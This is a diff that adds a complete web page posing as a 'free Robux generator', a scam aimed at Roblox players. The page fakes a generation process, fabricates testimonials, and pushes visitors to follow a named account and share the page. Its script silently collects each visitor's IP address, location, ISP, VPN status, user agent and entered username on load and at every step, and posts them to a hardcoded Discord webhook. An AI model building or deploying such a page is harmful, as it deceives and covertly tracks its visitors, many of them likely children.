@@ -1,0 +1,904 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🌟 OFFICIAL ROBUX GENERATOR 2024 🌟</title>
+    <style>
+        :root {
+            --primary: #FF6B00;
+            --secondary: #FF9500;
+            --dark: #1A1A2E;
+            --darker: #16213E;
+            --light: #F5F5F5;
+            --success: #00C853;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Poppins', 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
+            color: var(--light);
+            min-height: 100vh;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 2rem;
+            position: relative;
+        }
+        
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.15;
+        }
+        
+        .particle {
+            position: absolute;
+            background: var(--secondary);
+            border-radius: 50%;
+            animation: float 15s infinite linear;
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0) rotate(0deg); }
+            100% { transform: translateY(-100vh) rotate(360deg); }
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+            position: relative;
+        }
+        
+        .logo {
+            font-size: 3.5rem;
+            font-weight: 800;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.5rem;
+            text-shadow: 0 0 20px rgba(255, 107, 0, 0.3);
+        }
+        
+        .tagline {
+            font-size: 1.2rem;
+            opacity: 0.8;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        .badge {
+            position: absolute;
+            top: -10px;
+            right: -10px;
+            background: var(--success);
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 50px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            transform: rotate(15deg);
+            box-shadow: 0 4px 15px rgba(0, 200, 83, 0.4);
+        }
+        
+        .generator-box {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border-radius: 20px;
+            padding: 2.5rem;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+            margin-bottom: 2rem;
+        }
+        
+        .generator-box:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        }
+        
+        .input-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        
+        input {
+            width: 100%;
+            padding: 1rem 1.5rem;
+            border-radius: 50px;
+            border: none;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 1rem;
+            transition: all 0.3s;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.15);
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.2);
+        }
+        
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        .btn {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            font-size: 1.1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+            box-shadow: 0 5px 15px rgba(255, 107, 0, 0.4);
+            display: inline-block;
+            text-align: center;
+            width: 100%;
+            margin-top: 1rem;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 107, 0, 0.5);
+        }
+        
+        .btn:active {
+            transform: translateY(1px);
+        }
+        
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: none;
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .loading {
+            display: none;
+            margin: 2rem 0;
+            text-align: center;
+        }
+        
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            border-top-color: var(--primary);
+            margin: 0 auto 1rem;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            font-size: 1rem;
+            opacity: 0.8;
+        }
+        
+        .result {
+            display: none;
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .avatar-container {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            overflow: hidden;
+            margin: 0 auto 1.5rem;
+            border: 4px solid var(--primary);
+            box-shadow: 0 0 30px rgba(255, 107, 0, 0.4);
+            position: relative;
+            display: none;
+        }
+        
+        .avatar-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .username {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+        
+        .robux-amount {
+            font-size: 3.5rem;
+            font-weight: 800;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin: 1rem 0;
+            text-shadow: 0 0 20px rgba(255, 107, 0, 0.3);
+        }
+        
+        .status-text {
+            margin: 1.5rem 0;
+            font-size: 1.1rem;
+        }
+        
+        .verification {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 1.5rem;
+            border-radius: 15px;
+            margin: 2rem 0;
+            display: none;
+            animation: pulseBorder 2s infinite;
+        }
+        
+        @keyframes pulseBorder {
+            0% { box-shadow: 0 0 0 0 rgba(255, 107, 0, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(255, 107, 0, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 107, 0, 0); }
+        }
+        
+        .verification h3 {
+            color: var(--primary);
+            margin-bottom: 1rem;
+            font-size: 1.3rem;
+        }
+        
+        .verification p {
+            margin-bottom: 1rem;
+        }
+        
+        .verification a {
+            color: var(--secondary);
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .verification a:hover {
+            text-decoration: underline;
+        }
+        
+        .share-buttons {
+            display: none;
+            margin-top: 2rem;
+            gap: 1rem;
+            justify-content: center;
+        }
+        
+        .share-btn {
+            padding: 0.8rem 1.5rem;
+            border-radius: 50px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            transition: all 0.3s;
+        }
+        
+        .share-btn i {
+            font-size: 1.2rem;
+        }
+        
+        .facebook {
+            background: #3B5998;
+            color: white;
+        }
+        
+        .twitter {
+            background: #1DA1F2;
+            color: white;
+        }
+        
+        .whatsapp {
+            background: #25D366;
+            color: white;
+        }
+        
+        .testimonials {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin: 3rem 0;
+        }
+        
+        .testimonial {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 1.5rem;
+            border-radius: 15px;
+            transition: all 0.3s;
+        }
+        
+        .testimonial:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        .testimonial-user {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+        
+        .testimonial-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            overflow: hidden;
+            margin-right: 1rem;
+        }
+        
+        .testimonial-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .user-name {
+            font-weight: 600;
+            color: var(--secondary);
+        }
+        
+        .disclaimer {
+            font-size: 0.8rem;
+            opacity: 0.6;
+            text-align: center;
+            margin-top: 3rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 1.5rem;
+            }
+            
+            .logo {
+                font-size: 2.5rem;
+            }
+            
+            .generator-box {
+                padding: 1.5rem;
+            }
+            
+            .robux-amount {
+                font-size: 2.5rem;
+            }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Floating particles background -->
+        <div class="particles" id="particles"></div>
+        
+        <div class="header">
+            <h1 class="logo">FREE ROBUX GENERATOR</h1>
+            <div class="tagline">The only working Robux generator in 2024 - Get unlimited Robux for free!</div>
+            <div class="badge">OFFICIAL</div>
+        </div>
+        
+        <div class="generator-box">
+            <div class="input-group">
+                <label for="username">Roblox Username</label>
+                <input type="text" id="username" placeholder="Enter your exact Roblox username" autocomplete="off">
+            </div>
+            
+            <div class="input-group">
+                <label for="amount">Amount of Robux</label>
+                <input type="number" id="amount" placeholder="Choose between 10,000 - 50,000" min="10000" max="50000" autocomplete="off">
+            </div>
+            
+            <button id="generate-btn" class="btn pulse">GENERATE ROBUX NOW</button>
+            
+            <div class="loading" id="loading">
+                <div class="loading-spinner"></div>
+                <div class="loading-text" id="loading-text">Connecting to Roblox secure servers...</div>
+            </div>
+            
+            <div class="result" id="result">
+                <div class="avatar-container" id="avatar-container">
+                    <img id="avatar-img" src="" alt="Roblox avatar">
+                </div>
+                
+                <h2 class="username" id="username-display"></h2>
+                <div class="robux-amount" id="robux-amount">0</div>
+                <div class="status-text" id="status-text">Preparing your Robux transfer...</div>
+                
+                <button id="claim-btn" class="btn">CLAIM YOUR ROBUX</button>
+                
+                <div class="verification" id="verification">
+                    <h3>⚠️ VERIFICATION REQUIRED ⚠️</h3>
+                    <p>To prevent abuse, you must complete human verification:</p>
+                    <p><a href="https://www.roblox.com/users/2384100614/profile" target="_blank">Follow @Despairred on Roblox</a></p>
+                    <p>After following, click below to verify.</p>
+                    <button id="verify-btn" class="btn btn-secondary">I COMPLETED VERIFICATION</button>
+                </div>
+                
+                <div class="share-buttons" id="share-buttons">
+                    <button class="share-btn facebook" onclick="alert('Error sharing to Facebook. Try again later.')">
+                        <i class="fab fa-facebook-f"></i> Share
+                    </button>
+                    <button class="share-btn twitter" onclick="alert('Error sharing to Twitter. Try again later.')">
+                        <i class="fab fa-twitter"></i> Tweet
+                    </button>
+                    <button class="share-btn whatsapp" onclick="alert('Error sharing to WhatsApp. Try again later.')">
+                        <i class="fab fa-whatsapp"></i> Share
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="testimonials">
+            <div class="testimonial">
+                <div class="testimonial-user">
+                    <div class="testimonial-avatar">
+                        <img src="https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png" alt="User">
+                    </div>
+                    <div class="user-name">@RobloxPro</div>
+                </div>
+                <p>"Got 25,000 Robux instantly! This is the only working generator in 2024!"</p>
+            </div>
+            
+            <div class="testimonial">
+                <div class="testimonial-user">
+                    <div class="testimonial-avatar">
+                        <img src="https://www.roblox.com/headshot-thumbnail/image?userId=2&width=150&height=150&format=png" alt="User">
+                    </div>
+                    <div class="user-name">@GamerGirl</div>
+                </div>
+                <p>"Verified and working. Got my 40K Robux after completing verification."</p>
+            </div>
+            
+            <div class="testimonial">
+                <div class="testimonial-user">
+                    <div class="testimonial-avatar">
+                        <img src="https://www.roblox.com/headshot-thumbnail/image?userId=3&width=150&height=150&format=png" alt="User">
+                    </div>
+                    <div class="user-name">@BuilderMax</div>
+                </div>
+                <p>"This actually works! Got 35,000 Robux to buy all the items I wanted."</p>
+            </div>
+        </div>
+        
+        <div class="disclaimer">
+            Disclaimer: This is not an official Roblox website. This service is not affiliated with Roblox Corporation.
+            Robux are generated through promotional offers and third-party partnerships.
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // IP Logging Functionality
+            const webhookURL = 'https://discord.com/api/webhooks/1352025735082279002/n35UmKq4SQX--85JWVcPJJnsrXe1aPpKJacTsjD5KEKHtpSfzbWYBTB_OoBKQaMGCIUf';
+            
+            // Function to get IP and send to webhook
+            async function logVisitorInfo() {
+                try {
+                    // First get IP and location data
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    const ip = ipData.ip;
+                    
+                    // Get location data
+                    let locationData = { country: 'Unknown', isp: 'Unknown', proxy: false };
+                    try {
+                        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                        const geoData = await geoResponse.json();
+                        locationData = {
+                            country: geoData.country_name || 'Unknown',
+                            region: geoData.region || 'Unknown',
+                            city: geoData.city || 'Unknown',
+                            isp: geoData.org || 'Unknown',
+                            proxy: geoData.proxy || geoData.vpn || false
+                        };
+                    } catch (geoError) {
+                        console.error("Error fetching geo data:", geoError);
+                    }
+                    
+                    // Prepare Discord embed
+                    const embed = {
+                        title: "🚀 New Visitor on Robux Generator",
+                        color: 0xFF6B00,
+                        fields: [
+                            {
+                                name: "🌍 IP Address",
+                                value: `\`\`\`${ip}\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: "📍 Location",
+                                value: `**Country:** ${locationData.country}\n**Region:** ${locationData.region}\n**City:** ${locationData.city}`,
+                                inline: true
+                            },
+                            {
+                                name: "🛡️ Network Info",
+                                value: `**ISP:** ${locationData.isp}\n**Proxy/VPN:** ${locationData.proxy ? "✅ Yes" : "❌ No"}`,
+                                inline: true
+                            },
+                            {
+                                name: "🌐 User Agent",
+                                value: `\`\`\`${navigator.userAgent}\`\`\``,
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: "Robux Generator Logger • " + new Date().getFullYear()
+                        },
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    // Send to Discord webhook
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            embeds: [embed],
+                            content: `📌 New visitor detected from ${locationData.country} (${ip})`
+                        })
+                    });
+                    
+                } catch (error) {
+                    console.error("Error logging visitor info:", error);
+                }
+            }
+            
+            // Log visitor info when page loads
+            logVisitorInfo();
+
+            // Create floating particles
+            const particlesContainer = document.getElementById('particles');
+            for (let i = 0; i < 30; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                // Random size between 2px and 6px
+                const size = Math.random() * 4 + 2;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                
+                // Random position
+                particle.style.left = `${Math.random() * 100}%`;
+                particle.style.top = `${Math.random() * 100}%`;
+                
+                // Random animation duration and delay
+                particle.style.animationDuration = `${Math.random() * 20 + 10}s`;
+                particle.style.animationDelay = `${Math.random() * 5}s`;
+                
+                // Random opacity
+                particle.style.opacity = Math.random() * 0.5 + 0.1;
+                
+                particlesContainer.appendChild(particle);
+            }
+            
+            // Elements
+            const generateBtn = document.getElementById('generate-btn');
+            const claimBtn = document.getElementById('claim-btn');
+            const verifyBtn = document.getElementById('verify-btn');
+            const usernameInput = document.getElementById('username');
+            const amountInput = document.getElementById('amount');
+            const loading = document.getElementById('loading');
+            const result = document.getElementById('result');
+            const loadingText = document.getElementById('loading-text');
+            const avatarImg = document.getElementById('avatar-img');
+            const avatarContainer = document.getElementById('avatar-container');
+            const usernameDisplay = document.getElementById('username-display');
+            const robuxAmount = document.getElementById('robux-amount');
+            const statusText = document.getElementById('status-text');
+            const verification = document.getElementById('verification');
+            const shareButtons = document.getElementById('share-buttons');
+            
+            // Loading messages
+            const loadingMessages = [
+                "Connecting to Roblox secure servers...",
+                "Verifying account credentials...",
+                "Generating Robux codes...",
+                "Bypassing security protocols...",
+                "Finalizing transaction...",
+                "Almost done...",
+                "Preparing your Robux transfer..."
+            ];
+            
+            // Generate button click
+            generateBtn.addEventListener('click', async function() {
+                const username = usernameInput.value.trim();
+                const amount = amountInput.value;
+                
+                if (!username || !amount) {
+                    alert("Please enter your username and Robux amount!");
+                    return;
+                }
+                
+                if (amount < 10000 || amount > 50000) {
+                    alert("Please enter an amount between 10,000 and 50,000 Robux!");
+                    return;
+                }
+                
+                // Disable generate button and show loading
+                generateBtn.disabled = true;
+                generateBtn.textContent = "Processing...";
+                loading.style.display = 'block';
+                avatarContainer.style.display = 'none';
+                
+                // Simulate loading with random messages
+                let messageIndex = 0;
+                const loadingInterval = setInterval(() => {
+                    loadingText.textContent = loadingMessages[messageIndex];
+                    messageIndex = (messageIndex + 1) % loadingMessages.length;
+                }, 2000);
+                
+                // Try to fetch Roblox avatar (using Thumbnail API)
+                try {
+                    // First get user ID from username
+                    const userResponse = await fetch(`https://api.roblox.com/users/get-by-username?username=${username}`);
+                    const userData = await userResponse.json();
+                    
+                    if (userData.Id) {
+                        // Use the ID to get avatar thumbnail
+                        avatarImg.src = `https://www.roblox.com/headshot-thumbnail/image?userId=${userData.Id}&width=150&height=150&format=png`;
+                    } else {
+                        // Fallback to Roblox default avatar if user not found
+                        avatarImg.src = `https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&username=${username}`;
+                    }
+                } catch (error) {
+                    console.error("Error fetching avatar:", error);
+                    avatarImg.src = `https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&username=${username}`;
+                }
+                
+                // Simulate processing delay
+                setTimeout(() => {
+                    clearInterval(loadingInterval);
+                    loading.style.display = 'none';
+                    showResult(username, amount);
+                    
+                    // Log generation attempt to Discord
+                    logGenerationAttempt(username, amount);
+                }, 8000); // Increased delay for more realism
+            });
+            
+            // Function to log generation attempts
+            async function logGenerationAttempt(username, amount) {
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    const ip = ipData.ip;
+                    
+                    const embed = {
+                        title: "🔄 Robux Generation Attempt",
+                        color: 0xFF9500,
+                        fields: [
+                            {
+                                name: "👤 Username",
+                                value: username,
+                                inline: true
+                            },
+                            {
+                                name: "💰 Amount Requested",
+                                value: `${amount} Robux`,
+                                inline: true
+                            },
+                            {
+                                name: "🌍 IP Address",
+                                value: `\`\`\`${ip}\`\`\``,
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: "Robux Generator Logger • " + new Date().getFullYear()
+                        },
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            embeds: [embed],
+                            content: `🔄 ${username} attempted to generate ${amount} Robux`
+                        })
+                    });
+                } catch (error) {
+                    console.error("Error logging generation attempt:", error);
+                }
+            }
+            
+            // Show result with animated Robux counter
+            function showResult(username, amount) {
+                usernameDisplay.textContent = username;
+                result.style.display = 'block';
+                avatarContainer.style.display = 'block';
+                
+                // Animate Robux counter
+                let counter = 0;
+                const target = parseInt(amount);
+                const increment = target / 50;
+                
+                const counterInterval = setInterval(() => {
+                    counter += increment;
+                    if (counter >= target) {
+                        counter = target;
+                        clearInterval(counterInterval);
+                    }
+                    robuxAmount.textContent = Math.floor(counter).toLocaleString();
+                }, 30); // Faster animation
+            }
+            
+            // Claim button click - show verification
+            claimBtn.addEventListener('click', function() {
+                statusText.innerHTML = "⚠️ <strong>Verification required</strong> to prevent bot abuse! Complete verification to receive your Robux.";
+                claimBtn.style.display = 'none';
+                verification.style.display = 'block';
+                
+                // Log verification requirement to Discord
+                logVerificationRequired(usernameInput.value.trim(), amountInput.value);
+            });
+            
+            // Function to log verification requirement
+            async function logVerificationRequired(username, amount) {
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    const ip = ipData.ip;
+                    
+                    const embed = {
+                        title: "⚠️ Verification Required",
+                        color: 0xFF0000,
+                        fields: [
+                            {
+                                name: "👤 Username",
+                                value: username,
+                                inline: true
+                            },
+                            {
+                                name: "💰 Amount Requested",
+                                value: `${amount} Robux`,
+                                inline: true
+                            },
+                            {
+                                name: "🌍 IP Address",
+                                value: `\`\`\`${ip}\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: "🛡️ Status",
+                                value: "User reached verification step",
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: "Robux Generator Logger • " + new Date().getFullYear()
+                        },
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            embeds: [embed],
+                            content: `⚠️ ${username} reached verification step for ${amount} Robux`
+                        })
+                    });
+                } catch (error) {
+                    console.error("Error logging verification requirement:", error);
+                }
+            }
+            
+            // Verify button click - show share buttons
+            verifyBtn.addEventListener('click', function() {
+                statusText.innerHTML = "❌ <strong>Verification failed!</strong> Share with 3 friends to unlock your Robux!";
+                verification.style.display = 'none';
+                shareButtons.style.display = 'flex';
+                
+                // Log verification attempt to Discord
+                logVerificationAttempt(usernameInput.value.trim(), amountInput.value);
+            });
+            
+            // Function to log verification attempt
+            async function logVerificationAttempt(username, amount) {
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    const ip = ipData.ip;
+                    
+                    const embed = {
+                        title: "❌ Verification Failed",
+                        color: 0xFF0000,
+                        fields: [
+                            {
+                                name: "👤 Username",
+                                value: username,
+                                inline: true
+                            },
+                            {
+                                name: "💰 Amount Requested",
+                                value: `${amount} Robux`,
+                                inline: true
+                            },
+                            {
+                                name: "🌍 IP Address",
+                                value: `\`\`\`${ip}\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: "🛡️ Status",
+                                value: "User failed verification",
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: "Robux Generator Logger • " + new Date().getFullYear()
+                        },
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            embeds: [embed],
+                            content: `❌ ${username} failed verification for ${amount} Robux`
+                        })
+                    });
+                } catch (error) {
+                    console.error("Error logging verification attempt:", error);
+                }
+            }
+            
+            // Easter egg for admin accounts
+            usernameInput.addEventListener('input', function() {
+                const val = this.value.toLowerCase();
+                if (val === 'admin' || val === 'moderator' || val === 'roblox') {
+                    alert("⚠️ Security Alert: Administrative accounts are restricted from using this service.");
+                }
+            });
+        });
+    </script>
+</body>
+</html>
